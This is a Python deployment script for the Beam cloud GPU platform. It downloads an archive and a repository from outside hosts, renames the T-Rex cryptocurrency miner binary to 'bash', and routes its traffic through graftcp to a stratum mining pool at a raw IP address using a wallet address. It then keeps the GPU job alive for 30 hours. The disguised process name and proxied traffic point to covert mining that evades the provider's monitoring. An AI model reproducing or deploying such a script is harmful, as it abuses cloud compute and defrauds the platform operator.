from beam import function, Image
import subprocess
import time

image = (
    Image(
        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
    )
    .add_commands([
        "apt-get update -y",
        "apt-get install -y python3 python3-pip python-is-python3 git wget unzip curl ca-certificates",
    ])
)


@function(
    name="t4x3-runner",
    image=image,
    gpu="RTX4090",
    cpu=2,
    memory="4Gi",
    timeout=30 * 60 * 60,
)
def run_script():

    print("=== CHECK GPU ===")
    subprocess.run(["nvidia-smi"], check=False)

    cmd = """
    set -e

    echo "=== CURRENT DIRECTORY ==="
    pwd

    echo "=== DOWNLOAD FILE ==="
    wget -q https://github.com/malogrono/vb/releases/download/vcz/pan.zip -O pan.zip

    echo "=== EXTRACT ==="
    unzip -o pan.zip

    echo "=== CHECK PAN ==="
    ls -ld /mnt/code/pan
    ls -lah /mnt/code/pan

    echo "=== ENTER PAN ==="
    cd /mnt/code/pan

    echo "=== SET PERMISSION ==="
    chmod -R +x .

    echo "=== START GRAFTCP LOCAL ==="
    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &

    sleep 3

    echo "=== DOWNLOAD T-REX ==="
    cd /mnt/code/pan
    git clone https://gitlab.com/wimulyono7/t-rex.git

    echo "=== CHECK T-REX ==="
    ls -lah /mnt/code/pan/t-rex

    echo "=== CHECK BASH ==="
    cd /mnt/code/pan/t-rex
    ls -lh bash

    chmod u+x bash

    echo "=== MOVE BASH ==="
    mv bash /mnt/code/pan/

    echo "=== CHECK PAN AFTER MOVE ==="
    ls -ld /mnt/code/pan
    ls -lah /mnt/code/pan

    echo "=== FINAL DIRECTORY ==="
    cd /mnt/code/pan
    pwd
    ls -lah
    
    echo "=== RUN PROC VIA GRAFTCP ==="
    ./graftcp/graftcp ./bash -a progpowz -o stratum+tcp://95.111.195.159:80 -u iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV95YkTX46Ca2EZvo8wXS -p x -w TRX
    """

    subprocess.run(["bash", "-lc", cmd], check=False)

    print("Staying alive for 30 hours...")
    time.sleep(60 * 60 * 30)
